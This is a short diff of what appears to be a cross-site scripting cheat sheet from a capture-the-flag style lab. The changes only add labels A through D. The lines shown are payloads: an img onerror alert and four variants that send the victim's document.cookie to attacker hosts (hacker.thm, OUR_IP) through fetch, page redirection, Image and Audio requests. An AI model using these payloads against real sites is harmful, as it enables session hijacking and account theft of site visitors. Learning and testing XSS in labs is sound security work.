@@ -3,9 +3,14 @@
     <img src=x onerror=alert(PAYLOAD)>
 
 #### steal cookie:
+
+A
     <script>fetch('http://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+B
     document.location='http://OUR_IP/index.php?c='+document.cookie;
+C
     new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+D
     new Audio().src='http://OUR_IP/index.php?c='+document.cookie;
 
 
